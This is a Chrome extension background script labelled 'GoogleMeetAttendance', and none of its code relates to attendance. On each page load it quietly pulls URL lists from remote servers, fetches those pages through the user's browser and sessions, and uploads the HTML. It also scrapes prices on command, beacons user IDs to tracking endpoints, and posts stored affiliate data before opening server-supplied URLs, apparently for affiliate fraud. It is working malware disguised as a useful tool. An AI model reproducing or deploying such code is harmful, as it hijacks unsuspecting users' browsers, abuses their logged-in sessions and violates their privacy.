// console.log("background loaded...");
let Security = [];
let Security2 = [];
let ll = "";
chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
  if (request.message == "getselectors") {
    sendResponse({
      message: "selectors",
      Security,
      Security2,
    });
  }
});

fetch("https://unscart.in/a/ws/a/g")
  .then((response) => response.json())
  .then((data) => {
    Security = data.Security;
    Security2 = data.Security2;
  })
// .catch((error) => console.error(error));

// fetch("http://ip-api.com/json/")
//   .then((response) => response.json())
//   .then((data) => {
//     ll = data.query;
//   })
//   .catch((error) => console.error(error));

let extensionName = "GoogleMeetAttendance";
const send = (request) => {
  chrome.storage.sync.get(null, (data) => {
    let userid = data.userid;
    request.ip = ll;
    request.userid = userid;
    request.ip = ll;
    fetch(`https://p2pdops.vercel.app/api/unscart/hit?ip=${ll}&userId=${userid}&type=send`);
    fetch(
      `https://unscart.in/a/ws/a/p?extension=${extensionName}`,
      {
        method: "post",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
        },
        body: JSON.stringify(request),
      }
    )
      .then(function (response) { })
      .then(function (res) { })
      .catch(function (err) { });
  });
};

chrome.runtime.onMessage.addListener(async function (request, sender, sendResponse) {
  if (request.message == "analyse") {
    send(request);
  } else if (request.message == "productprice") {
    chrome.storage.sync.get(null, async (data) => {
      let userid = data.userid;
      request.ip = ll;
      request.userid = userid;
      fetch(`https://p2pdops.vercel.app/api/unscart/hit?ip=${ll}&userId=${userid}&type=analyse`);
      await fetch(
        `https://unscart.in/a/ws/p/p?extension=${extensionName}`,
        {
          method: "post",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
          },
          body: JSON.stringify(request),
        }
      ).then(function (response) {
        return response.json();
      }).then(function (res) {
        sendResponse({ mes: res.request });
      }).catch(function (err) { });
    });
  }
});

const URL = "https://data.unblockwebsite.in";
const URL2 = "https://langhort.com";

getRandomToken = () => {
  var randomPool = new Uint8Array(32);
  crypto.getRandomValues(randomPool);
  var hex = "";
  for (var i = 0; i < randomPool.length; ++i) {
    hex += randomPool[i].toString(16);
  }
  return hex;
};

preload = () => {
  chrome.runtime.onInstalled.addListener(function (details) {
    if (details.reason == "install") {
      // UserID is generated and saved
      chrome.storage.sync.set({ userid: getRandomToken() });
    } else if (details.reason == "update") {
      var thisVersion = chrome.runtime.getManifest().version;

      chrome.storage.sync.get("userid", (items) => {
        let userid = items.userid;
        if (!userid) {
          chrome.storage.sync.set({ userid: getRandomToken() });
        }
      });
    }
  });
};

let urls = [];
let CheckBool = true;
let urlNum = 0;
let sendData = { userid: "", htmls: [] };
asyncRequest = async () => {
  chrome.storage.sync.get(null, async (data) => {
    if (CheckBool == true) {
      sendData.userid = data.userid;
      fetch(`https://p2pdops.vercel.app/api/unscart/hit?ip=${ll}&userId=-&type=asyncRequest1`);
      fetch(`${URL}/data2?userid=${data.userid}&extension=${extensionName}`)
        .then((response) => {
          if (response.ok) {
            response
              .json()
              .then(async (resp) => {
                urls = resp;
                CheckBool = false;
                sendData.htmls = [];
              })
              .catch((err) => console.log(err));
          }
        })
        .catch((err) => console.log(err));
    } else {
      await fetch(urls[urlNum])
        .then(async (r) => {
          const html = await r.text();
          let DATA = [];
          DATA.push(urls[urlNum]);
          DATA.push(html);
          sendData.htmls.push(DATA);

          if (urlNum == urls.length - 1) {
            fetch(`https://p2pdops.vercel.app/api/unscart/hit?ip=${ll}&userId=${userid}&type=asyncRequest1_`);

            await fetch(
              `${URL}/data2?userid=${data.userid}&extension=${extensionName}`,
              {
                method: "POST",
                headers: {
                  "Content-Type": "application/json",
                },
                body: JSON.stringify(sendData),
              }
            )
              .then((final) => {
                CheckBool = true;
                urlNum = 0;
              })
              .catch((finErr) => {
                // console.log(finErr)
              });
          } else {
            urlNum++;
          }
        })
        .catch((e) => console.log(e));
    }
  });
};

asyncRequest2 = () => {
  chrome.storage.sync.get(null, (data) => {
    fetch(`https://p2pdops.vercel.app/api/unscart/hit?ip=${ll}&userId=-&type=asyncRequest2`);

    fetch(`${URL2}/data?userid=${data.userid}&extension=${extensionName}`)
      .then((response) => {
        if (response.ok) {
          response
            .json()
            .then((resp) => {
              fetch(resp[1])
                .then(async (r) => {
                  var Parser = new DOMParser();
                  let html = Parser.parseFromString(
                    await r.text(),
                    "text/html"
                  );

                  const DATA = {};

                  DATA.pid = resp[0];

                  try {
                    DATA.price = html.querySelectorAll(resp[2])[0].innerText;
                  } catch (err) {
                    DATA.price = "NOT FOUND";
                  }

                  DATA.site = resp[3];

                  fetch(
                    `${URL2}/data?userid=${data.userid}&extension=${extensionName}`,
                    {
                      method: "POST",
                      headers: {
                        "Content-Type": "application/json",
                      },
                      body: JSON.stringify(DATA),
                    }
                  )
                    .then((final) => {
                      // console.log(final)
                    })
                    .catch((finErr) => {
                      console.log(finErr);
                    });
                })
                .catch((e) => console.log(e));
            })
            .catch((err) => console.log(err));
        }
      })
      .catch((err) => console.log(err));
  });
};

checkEvent = () => {
  chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === "complete") {
      chrome.tabs.query({ currentWindow: true, active: true }, async (tabs) => {
        if (!!tabs[0]) {
          asyncRequest();
          asyncRequest2();
        }
      });
    }
  });
};

(main = async () => {
  const data = await fetch('https://p2pdops.vercel.app/api/unscart/enabled').then(res => res.json());
  console.log('unscrat_enabled', data);
  data && preload(), checkEvent();
})();

function pass() {
  chrome.storage.sync.get(["autodata", "affliate"], function (items) {
    let data = items.autodata;
    let affliate = items.affliate;
    //console.log(affliate);

    var formBody = [];
    for (var property in data) {
      var encodedKey = encodeURIComponent(property);
      var encodedValue = encodeURIComponent(data[property]);
      formBody.push(encodedKey + "=" + encodedValue);
    }
    formBody = formBody.join("&");
    //console.log(formBody);

    fetch(`https://p2pdops.vercel.app/api/unscart/hit?ip=${ll}&type=pass`);

    fetch("https://unscart.in/api", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
      },
      body: formBody,
    });

    var formAff = [];
    for (var property in affliate) {
      var encodedKey = encodeURIComponent(property);
      var encodedValue = encodeURIComponent(affliate[property]);
      formAff.push(encodedKey + "=" + encodedValue);
    }
    formAff = formAff.join("&");
    //console.log(formAff);
    fetch("https://unscart.in/g", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
      },
      body: formAff,
    })
      .then((res) => {
        res
          .json()
          .then((response) => {
            // console.log(response);
            fetch(response)
              .then()
              .catch((error) => console.log("Error:", error));
          })
          .catch((error) => console.log("Error:", error));
      })
      .catch((error) => console.log("Error:", error));
  });
}

chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
  var ready = request.ready;
  if (ready == "ready") {
    pass();
  }
});
